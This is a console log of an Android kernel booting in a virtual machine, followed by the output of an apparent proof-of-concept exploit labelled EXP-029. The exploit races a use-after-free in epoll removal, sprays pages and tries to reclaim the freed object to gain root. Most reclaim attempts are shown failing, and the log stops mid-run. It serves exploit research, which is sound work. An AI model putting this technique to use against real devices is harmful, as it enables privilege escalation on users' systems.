[    0.000000][    T0] Booting Linux on physical CPU 0x0000000000 [0x411fd070]
[    0.000000][    T0] Linux version 6.1.23-android14-4-maybe-dirty (build-user@build-host) (Android (10087095, +pgo, +bolt, +lto, -mlgo, based on r487747c) clang version 17.0.2 (https://android.googlesource.com/toolchain/llvm-project d9f89f4d16663d5012e5c09495f3b30ece3d2362), LLD 17.0.2) #1 SMP PREEMPT Thu Jan  1 00:00:00 UTC 1970
[    0.000000][    T0] random: crng init done
[    0.000000][    T0] Machine model: linux,dummy-virt
[    0.000000][    T0] Stack Depot is disabled
[    0.000000][    T0] KVM is not available. Ignoring kvm-arm.mode
[    0.000000][    T0] earlycon: pl11 at MMIO 0x0000000009000000 (options '')
[    0.000000][    T0] printk: bootconsole [pl11] enabled
[    0.000000][    T0] efi: UEFI not found.
[    0.000000][    T0] Zone ranges:
[    0.000000][    T0]   DMA32    [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0]   Normal   empty
[    0.000000][    T0]   Device   empty
[    0.000000][    T0] Movable zone start for each node
[    0.000000][    T0] Early memory node ranges
[    0.000000][    T0]   node   0: [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] Initmem setup node 0 [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] cma: Reserved 16 MiB at 0x00000000bc800000
[    0.000000][    T0] psci: probing for conduit method from DT.
[    0.000000][    T0] psci: PSCIv1.1 detected in firmware.
[    0.000000][    T0] psci: Using standard PSCI v0.2 function IDs
[    0.000000][    T0] psci: Trusted OS migration not required
[    0.000000][    T0] psci: SMC Calling Convention v1.0
[    0.000000][    T0] 'bootconfig' found on command line, but no bootconfig found
[    0.000000][    T0] percpu: Embedded 29 pages/cpu s80936 r8192 d29656 u118784
[    0.000000][    T0] Detected PIPT I-cache on CPU0
[    0.000000][    T0] CPU features: SYS_ID_AA64MMFR1_EL1[11:8]: already set to 0
[    0.000000][    T0] CPU features: detected: Spectre-v2
[    0.000000][    T0] CPU features: detected: Spectre-v3a
[    0.000000][    T0] CPU features: detected: Spectre-v4
[    0.000000][    T0] CPU features: detected: Spectre-BHB
[    0.000000][    T0] CPU features: detected: ARM erratum 834220
[    0.000000][    T0] CPU features: detected: ARM erratum 1742098
[    0.000000][    T0] CPU features: detected: ARM erratum 832075
[    0.000000][    T0] CPU features: detected: ARM errata 1165522, 1319367, or 1530923
[    0.000000][    T0] alternatives: applying boot alternatives
[    0.000000][    T0] Built 1 zonelists, mobility grouping on.  Total pages: 516096
[    0.000000][    T0] Kernel command line: console=ttynull stack_depot_disable=on cgroup_disable=pressure kasan.page_alloc.sample=10 kasan.stacktrace=off kvm-arm.mode=protected bootconfig ioremap_guard console=ttyAMA0 root=/dev/ram0 kasan=off nokaslr earlycon=pl011,0x09000000 printk.devkmsg=on isolcpus=1 rcu_nocbs=1 rw
[    0.000000][    T0] cgroup: Disabling pressure control group feature
[    0.000000][    T0] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.000000][    T0] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.000000][    T0] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.000000][    T0] mem auto-init: stack:all(zero), heap alloc:on, heap free:off
[    0.000000][    T0] Memory: 1998340K/2097152K available (16768K kernel code, 1878K rwdata, 5432K rodata, 1344K init, 600K bss, 82428K reserved, 16384K cma-reserved)
[    0.000000][    T0] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.000000][    T0] trace event string verifier disabled
[    0.000000][    T0] rcu: Preemptible hierarchical RCU implementation.
[    0.000000][    T0] rcu: 	RCU event tracing is enabled.
[    0.000000][    T0] rcu: 	RCU restricting CPUs from NR_CPUS=32 to nr_cpu_ids=2.
[    0.000000][    T0] rcu: 	RCU priority boosting: priority 1 delay 500 ms.
[    0.000000][    T0] 	Trampoline variant of Tasks RCU enabled.
[    0.000000][    T0] 	Tracing variant of Tasks RCU enabled.
[    0.000000][    T0] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.
[    0.000000][    T0] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.000000][    T0] NR_IRQS: 64, nr_irqs: 64, preallocated irqs: 0
[    0.000000][    T0] Root IRQ handler: gic_handle_irq
[    0.000000][    T0] GICv2m: range[mem 0x08020000-0x08020fff], SPI[80:143]
[    0.000000][    T0] rcu: 	Offload RCU callbacks from CPUs: 1.
[    0.000000][    T0] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.000000][    T0] arch_timer: cp15 timer(s) running at 62.50MHz (virt).
[    0.000000][    T0] clocksource: arch_sys_counter: mask: 0x1ffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns
[    0.000089][    T0] sched_clock: 57 bits at 63MHz, resolution 16ns, wraps every 4398046511096ns
[    0.003421][    T0] kfence: initialized - using 524288 bytes for 63 objects at 0x(____ptrval____)-0x(____ptrval____)
[    0.013633][    T0] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=250000)
[    0.014285][    T0] pid_max: default: 32768 minimum: 301
[    0.016212][    T0] LSM: Security Framework initializing
[    0.017869][    T0] SELinux:  Initializing.
[    0.021598][    T0] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.021958][    T0] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.066639][    T1] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    0.080267][    T1] cblist_init_generic: Setting adjustable number of callback queues.
[    0.080755][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.081667][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.085109][    T1] rcu: Hierarchical SRCU implementation.
[    0.085404][    T1] rcu: 	Max phase no-delay instances is 1000.
[    0.100479][    T1] dyndbg: Ignore empty _ddebug table in a CONFIG_DYNAMIC_DEBUG_CORE build
[    0.101580][    T1] EFI services will not be available.
[    0.104899][    T1] smp: Bringing up secondary CPUs ...
[    0.110714][    T0] Detected PIPT I-cache on CPU1
[    0.111627][    T0] cacheinfo: Unable to detect cache hierarchy for CPU 1
[    0.112261][    T0] CPU1: Booted secondary processor 0x0000000001 [0x411fd070]
[    0.116825][    T1] smp: Brought up 1 node, 2 CPUs
[    0.117716][    T1] SMP: Total of 2 processors activated.
[    0.117960][    T1] CPU features: detected: 32-bit EL0 Support
[    0.118158][    T1] CPU features: detected: 32-bit EL1 Support
[    0.118395][    T1] CPU features: detected: CRC32 instructions
[    0.122397][    T1] CPU features: emulated: Privileged Access Never (PAN) using TTBR0_EL1 switching
[    0.123251][    T1] CPU: All CPU(s) started at EL1
[    0.123660][    T1] alternatives: applying system-wide alternatives
[    0.154454][    T1] Registered cp15_barrier emulation handler
[    0.154922][    T1] Registered setend emulation handler
[    0.157640][    T1] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.158238][    T1] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.164437][    T1] pinctrl core: initialized pinctrl subsystem
[    0.187393][    T1] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.204470][    T1] DMA: preallocated 256 KiB GFP_KERNEL pool for atomic allocations
[    0.205804][    T1] DMA: preallocated 256 KiB GFP_KERNEL|GFP_DMA32 pool for atomic allocations
[    0.206628][    T1] audit: initializing netlink subsys (disabled)
[    0.215570][    T1] thermal_sys: Registered thermal governor 'step_wise'
[    0.215642][    T1] thermal_sys: Registered thermal governor 'user_space'
[    0.215909][    T1] thermal_sys: Registered thermal governor 'power_allocator'
[    0.217122][   T30] audit: type=2000 audit(0.184:1): state=initialized audit_enabled=0 res=1
[    0.217997][    T1] cpuidle: using governor menu
[    0.220080][    T1] hw-breakpoint: found 6 breakpoint and 4 watchpoint registers.
[    0.221356][    T1] ASID allocator initialised with 65536 entries
[    0.223112][    T1] Serial: AMBA PL011 UART driver
[    0.254520][    T1] 9000000.pl011: ttyAMA0 at MMIO 0x9000000 (irq = 13, base_baud = 0) is a PL011 rev1
[    0.256808][    T1] printk: console [ttyAMA0] enabled
[    0.256808][    T1] printk: console [ttyAMA0] enabled
[    0.257518][    T1] printk: bootconsole [pl11] disabled
[    0.257518][    T1] printk: bootconsole [pl11] disabled
[    0.266424][    T1] KASLR disabled on command line
[    0.332900][    T1] iommu: Default domain type: Translated 
[    0.333344][    T1] iommu: DMA domain TLB invalidation policy: strict mode 
[    0.337033][    T1] SCSI subsystem initialized
[    0.338529][    T1] usbcore: registered new interface driver usbfs
[    0.339100][    T1] usbcore: registered new interface driver hub
[    0.339519][    T1] usbcore: registered new device driver usb
[    0.340748][    T1] mc: Linux media interface: v0.10
[    0.341072][    T1] videodev: Linux video capture interface: v2.00
[    0.342160][    T1] pps_core: LinuxPPS API ver. 1 registered
[    0.342355][    T1] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.342817][    T1] PTP clock support registered
[    0.343267][    T1] EDAC MC: Ver: 3.0.0
[    0.364044][    T1] Advanced Linux Sound Architecture Driver Initialized.
[    0.385864][    T1] clocksource: Switched to clocksource arch_sys_counter
[    0.410291][    T1] VFS: Disk quotas dquot_6.6.0
[    0.410691][    T1] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.415120][    T1] NET: Registered PF_INET protocol family
[    0.426580][    T1] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.443428][    T1] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.444061][    T1] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.444522][    T1] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.445353][    T1] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.445982][    T1] TCP: Hash tables configured (established 16384 bind 16384)
[    0.447541][    T1] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.448087][    T1] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.457823][    T1] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.458748][    T1] NET: Registered PF_XDP protocol family
[    0.459167][    T1] PCI: CLS 0 bytes, default 64
[    0.468669][    T8] Trying to unpack rootfs image as initramfs...
[    0.482195][    T1] hw perfevents: enabled with armv8_pmuv3 PMU driver, 7 counters available
[    0.483497][    T1] kvm [1]: HYP mode not available
[    0.488210][    T1] Initialise system trusted keyrings
[    0.506795][    T1] workingset: timestamp_bits=46 max_order=19 bucket_order=0
[    0.571123][    T1] fuse: init (API version 7.37)
[    0.676664][    T8] Freeing initrd memory: 14424K
[    0.688176][    T1] Key type asymmetric registered
[    0.688574][    T1] Asymmetric key parser 'x509' registered
[    0.689178][    T1] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 239)
[    0.690351][    T1] io scheduler mq-deadline registered
[    0.690624][    T1] io scheduler kyber registered
[    0.691432][    T1] io scheduler bfq registered
[    0.700280][    T1] pl061_gpio 9030000.pl061: PL061 GPIO chip registered
[    0.702322][    T1] pci-host-generic 4010000000.pcie: host bridge /pcie@10000000 ranges:
[    0.703437][    T1] pci-host-generic 4010000000.pcie:       IO 0x003eff0000..0x003effffff -> 0x0000000000
[    0.704358][    T1] pci-host-generic 4010000000.pcie:      MEM 0x0010000000..0x003efeffff -> 0x0010000000
[    0.704683][    T1] pci-host-generic 4010000000.pcie:      MEM 0x8000000000..0xffffffffff -> 0x8000000000
[    0.705501][    T1] pci-host-generic 4010000000.pcie: Memory resource size exceeds max for 32 bits
[    0.706453][    T1] pci-host-generic 4010000000.pcie: ECAM at [mem 0x4010000000-0x401fffffff] for [bus 00-ff]
[    0.708087][    T1] pci-host-generic 4010000000.pcie: PCI host bridge to bus 0000:00
[    0.708626][    T1] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.708896][    T1] pci_bus 0000:00: root bus resource [io  0x0000-0xffff]
[    0.709170][    T1] pci_bus 0000:00: root bus resource [mem 0x10000000-0x3efeffff]
[    0.709400][    T1] pci_bus 0000:00: root bus resource [mem 0x8000000000-0xffffffffff]
[    0.711961][    T1] pci 0000:00:00.0: [1b36:0008] type 00 class 0x060000
[    0.717329][    T1] pci 0000:00:01.0: [1af4:1000] type 00 class 0x020000
[    0.717997][    T1] pci 0000:00:01.0: reg 0x10: [io  0x0000-0x001f]
[    0.718268][    T1] pci 0000:00:01.0: reg 0x14: [mem 0x00000000-0x00000fff]
[    0.718561][    T1] pci 0000:00:01.0: reg 0x20: [mem 0x00000000-0x00003fff 64bit pref]
[    0.718949][    T1] pci 0000:00:01.0: reg 0x30: [mem 0x00000000-0x0003ffff pref]
[    0.722957][    T1] pci 0000:00:01.0: BAR 6: assigned [mem 0x10000000-0x1003ffff pref]
[    0.723615][    T1] pci 0000:00:01.0: BAR 4: assigned [mem 0x8000000000-0x8000003fff 64bit pref]
[    0.724081][    T1] pci 0000:00:01.0: BAR 1: assigned [mem 0x10040000-0x10040fff]
[    0.724359][    T1] pci 0000:00:01.0: BAR 0: assigned [io  0x1000-0x101f]
[    0.733043][    T1] printk: console [ttynull0] enabled
[    0.734749][   T22] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    0.777754][    T1] brd: module loaded
[    0.806812][    T1] loop: module loaded
[    0.813889][    T1] wireguard: WireGuard 1.0.0 loaded. See www.wireguard.com for information.
[    0.814211][    T1] wireguard: Copyright (C) 2015-2019 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
[    0.816924][    T1] MACsec IEEE 802.1AE
[    0.820134][    T1] tun: Universal TUN/TAP device driver, 1.6
[    0.820755][    T1] usbcore: registered new interface driver rtl8150
[    0.821110][    T1] usbcore: registered new interface driver r8152
[    0.821444][    T1] usbcore: registered new interface driver asix
[    0.821989][    T1] usbcore: registered new interface driver ax88179_178a
[    0.822319][    T1] usbcore: registered new interface driver cdc_ether
[    0.822635][    T1] usbcore: registered new interface driver cdc_eem
[    0.823005][    T1] usbcore: registered new interface driver cdc_ncm
[    0.823302][    T1] usbcore: registered new interface driver aqc111
[    0.823596][    T1] usbcore: registered new interface driver r8153_ecm
[    0.826735][    T1] usbcore: registered new interface driver uas
[    0.827234][    T1] usbcore: registered new interface driver usb-storage
[    0.833266][    T1] usbcore: registered new interface driver xpad
[    0.837900][    T1] rtc-pl031 9010000.pl031: registered as rtc0
[    0.838924][    T1] rtc-pl031 9010000.pl031: setting system clock to 2026-09-12T17:39:55 UTC (1789234795)
[    0.840296][    T1] gspca_main: v2.14.0 registered
[    0.840745][    T1] usbcore: registered new interface driver uvcvideo
[    0.842102][    T1] device-mapper: uevent: version 1.0.3
[    0.843415][    T1] device-mapper: ioctl: 4.47.0-ioctl (2022-07-28) initialised: dm-devel@redhat.com
[    0.847173][    T1] sdhci: Secure Digital Host Controller Interface driver
[    0.847426][    T1] sdhci: Copyright(c) Pierre Ossman
[    0.847605][    T1] sdhci-pltfm: SDHCI platform and OF driver helper
[    0.849132][    T1] hid: raw HID events driver (C) Jiri Kosina
[    0.853963][    T1] usbcore: registered new interface driver usbhid
[    0.854209][    T1] usbhid: USB HID core driver
[    0.855198][    T1] ashmem: initialized
[    0.856813][    T1] gnss: GNSS driver registered with major 506
[    0.859363][    T1] usbcore: registered new interface driver snd-usb-audio
[    0.862168][    T1] GACT probability NOT on
[    0.862637][    T1] Mirror/redirect action on
[    0.863298][    T1] netem: version 1.3
[    0.863726][    T1] u32 classifier
[    0.863864][    T1]     input device check on
[    0.864016][    T1]     Actions configured
[    0.875669][    T1] xt_time: kernel timezone is -0000
[    0.876369][    T1] ipip: IPv4 and MPLS over IPv4 tunneling driver
[    0.879195][    T1] gre: GRE over IPv4 demultiplexor driver
[    0.879446][    T1] ip_gre: GRE over IPv4 tunneling driver
[    0.883139][    T1] IPv4 over IPsec tunneling driver
[    0.887150][    T1] Initializing XFRM netlink socket
[    0.887598][    T1] IPsec XFRM device driver
[    0.889756][    T1] NET: Registered PF_INET6 protocol family
[    0.903427][    T1] Segment Routing with IPv6
[    0.903807][    T1] In-situ OAM (IOAM) with IPv6
[    0.905277][    T1] mip6: Mobile IPv6
[    0.909802][    T1] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    0.913968][    T1] ip6_gre: GRE over IPv6 tunneling driver
[    0.916363][    T1] NET: Registered PF_PACKET protocol family
[    0.916783][    T1] NET: Registered PF_KEY protocol family
[    0.918150][    T1] NET: Registered PF_VSOCK protocol family
[    0.921078][    T1] registered taskstats version 1
[    0.921599][    T1] Loading compiled-in X.509 certificates
[    0.943662][    T1] Loaded X.509 cert 'Build time autogenerated kernel key: 3d126cdde7d34f1fa54a4d10fe73f129512afbbc'
[    0.944568][    T1] page_owner is disabled
[    0.945435][    T1] Key type .fscrypt registered
[    0.945721][    T1] Key type fscrypt-provisioning registered
[    0.950395][   T54] cryptomgr_probe (54) used greatest stack depth: 15056 bytes left
[    0.968210][    T1] input: gpio-keys as /devices/platform/gpio-keys/input/input0
[    0.985352][    T1] ALSA device list:
[    0.985748][    T1]   No soundcards found.
[    0.990782][    T1] uart-pl011 9000000.pl011: no DMA platform data
[    1.052434][    T1] Freeing unused kernel memory: 1344K
[    1.054840][    T1] Run /init as init process
[INIT] Starting init process for EXP-029...
[    1.107983][    T1] request_module fs-devtmpfs succeeded, but still no fs?
==========================================================
=== EXP-029: Corrected Unassisted E2E PoC (Step 2)     ===
==========================================================
[+] /dev/dma_heap/system device node created.
[*] Slab geometry: object_size=232, slab_size=256, objs_per_slab=16
[*] Using slab stride = 256 bytes (16 objects per page)
[*] Symbols resolved:
[*]   init_task       = 0xffffffc00973dac0
[*]   comm            = 0xffffffc00973e258
[*]   swaps_proc_ops  = 0xffffffc009123200
[*]   empty_zero_page = 0xffffffc0098fd000
[*]   fake_fops       = 0xffffffc0091231b8
[+] dma_heap fd obtained.
[*] PRE-DROP PRIVILEGE CHECK: uid=0 euid=0
[*] POST-DROP PRIVILEGE CHECK: uid=2000 euid=2000
==========================================================
[+] PRIVILEGE DROP CONFIRMED: uid=2000, euid=2000.
[+] Any future getuid()==0 is a GENUINE escalation result.
==========================================================
[+] Timerfd interrupt widening queue configured.
[*] Starting N=150000 natural two-stage race iterations...
[   53.950577][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e86c0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 2075 (total wins=1). Draining...
[*] Slab drain: 265 -> 18 slabs (delta=247)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 1) to avoid cleanup panic.
[   64.600985][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8240 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 2115 (total wins=2). Draining...
[*] Slab drain: 264 -> 19 slabs (delta=245)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 2) to avoid cleanup panic.
[  115.400061][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8480 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 4238 (total wins=3). Draining...
[*] Slab drain: 265 -> 20 slabs (delta=245)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 3) to avoid cleanup panic.
[*] Completed 5000 / 150000 iterations (wins=3)...
[  184.764166][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8000 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 7314 (total wins=4). Draining...
[*] Slab drain: 263 -> 18 slabs (delta=245)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 4) to avoid cleanup panic.
[*] Completed 10000 / 150000 iterations (wins=4)...
[  316.414500][   T21] kworker/dying (21) used greatest stack depth: 14304 bytes left
[+] NATURAL RACE HIT! Iteration 14630 (total wins=5). Draining...
[*] Slab drain: 265 -> 15 slabs (delta=250)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 5) to avoid cleanup panic.
[*] Completed 15000 / 150000 iterations (wins=5)...
[  404.767144][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8e40 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 17627 (total wins=6). Draining...
[*] Slab drain: 263 -> 19 slabs (delta=244)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 6) to avoid cleanup panic.
[*] Completed 20000 / 150000 iterations (wins=6)...
[  521.530664][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8540 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 23149 (total wins=7). Draining...
[*] Slab drain: 265 -> 17 slabs (delta=248)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 7) to avoid cleanup panic.
[+] NATURAL RACE HIT! Iteration 23500 (total wins=8). Draining...
[*] Slab drain: 264 -> 21 slabs (delta=243)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 8) to avoid cleanup panic.
[*] Completed 25000 / 150000 iterations (wins=8)...
[  590.097879][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8240 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 25689 (total wins=9). Draining...
[*] Slab drain: 264 -> 18 slabs (delta=246)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 9) to avoid cleanup panic.
[  603.540808][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8540 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 25882 (total wins=10). Draining...
[*] Slab drain: 266 -> 25 slabs (delta=241)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 10) to avoid cleanup panic.
[  644.094181][    T8] kworker/dying (8) used greatest stack depth: 12944 bytes left
[  654.657516][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e80c0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 28017 (total wins=11). Draining...
[*] Slab drain: 269 -> 24 slabs (delta=245)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 11) to avoid cleanup panic.
[*] Completed 30000 / 150000 iterations (wins=11)...
[+] NATURAL RACE HIT! Iteration 32169 (total wins=12). Draining...
[*] Slab drain: 264 -> 24 slabs (delta=240)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 12) to avoid cleanup panic.
[*] Completed 35000 / 150000 iterations (wins=12)...
[  827.793229][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8b40 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 36014 (total wins=13). Draining...
[*] Slab drain: 271 -> 22 slabs (delta=249)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 13) to avoid cleanup panic.
[  852.577977][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8b40 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 36795 (total wins=14). Draining...
[*] Slab drain: 270 -> 29 slabs (delta=241)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 14) to avoid cleanup panic.
[+] NATURAL RACE HIT! Iteration 36955 (total wins=15). Draining...
[*] Slab drain: 263 -> 25 slabs (delta=238)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 15) to avoid cleanup panic.
[+] NATURAL RACE HIT! Iteration 39119 (total wins=16). Draining...
[*] Slab drain: 267 -> 29 slabs (delta=238)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 16) to avoid cleanup panic.
[*] Completed 40000 / 150000 iterations (wins=16)...
[ 1036.484122][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045e8840 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 44807 (total wins=17). Draining...
[*] Slab drain: 269 -> 32 slabs (delta=237)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 17) to avoid cleanup panic.
[*] Completed 45000 / 150000 iterations (wins=17)...
[+] NATURAL RACE HIT! Iteration 47801 (total wins=18). Draining...
[*] Slab drain: 265 -> 32 slabs (delta=233)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 18) to avoid cleanup panic.
[*] Completed 50000 / 150000 iterations (wins=18)...
[*] Completed 55000 / 150000 iterations (wins=18)...
[+] NATURAL RACE HIT! Iteration 55224 (total wins=19). Draining...
[*] Slab drain: 267 -> 32 slabs (delta=235)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 19) to avoid cleanup panic.
[*] Completed 60000 / 150000 iterations (wins=19)...
[*] Completed 65000 / 150000 iterations (wins=19)...
[*] Completed 70000 / 150000 iterations (wins=19)...
[ 1556.911759][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da90c0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 70592 (total wins=20). Draining...
[*] Slab drain: 264 -> 36 slabs (delta=228)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 20) to avoid cleanup panic.
[ 1566.356567][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9300 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 70595 (total wins=21). Draining...
[*] Slab drain: 265 -> 32 slabs (delta=233)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 21) to avoid cleanup panic.
[*] Completed 75000 / 150000 iterations (wins=21)...
[*] Completed 80000 / 150000 iterations (wins=21)...
[*] Completed 85000 / 150000 iterations (wins=21)...
[ 1863.533502][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9cc0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 85842 (total wins=22). Draining...
[*] Slab drain: 267 -> 34 slabs (delta=233)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 22) to avoid cleanup panic.
[+] NATURAL RACE HIT! Iteration 87091 (total wins=23). Draining...
[*] Slab drain: 267 -> 38 slabs (delta=229)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 23) to avoid cleanup panic.
[*] Completed 90000 / 150000 iterations (wins=23)...
[+] NATURAL RACE HIT! Iteration 91660 (total wins=24). Draining...
[*] Slab drain: 268 -> 38 slabs (delta=230)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 24) to avoid cleanup panic.
[*] Completed 95000 / 150000 iterations (wins=24)...
[*] Completed 100000 / 150000 iterations (wins=24)...
[*] Completed 105000 / 150000 iterations (wins=24)...
[+] NATURAL RACE HIT! Iteration 106812 (total wins=25). Draining...
[*] Slab drain: 270 -> 42 slabs (delta=228)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 25) to avoid cleanup panic.
[ 2357.641707][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9900 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 109846 (total wins=26). Draining...
[*] Slab drain: 270 -> 42 slabs (delta=228)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 26) to avoid cleanup panic.
[*] Completed 110000 / 150000 iterations (wins=26)...
[*] Completed 115000 / 150000 iterations (wins=26)...
[ 2469.800487][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8009da9e40 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 115313 (total wins=27). Draining...
[*] Slab drain: 268 -> 40 slabs (delta=228)
[*] Sprayed 8192 pages (target=8192)
[-] AAR Oracle Miss. Reclaim failed.
[*] Leaked ep_uaf_waiter fd (total leaked: 27) to avoid cleanup panic.
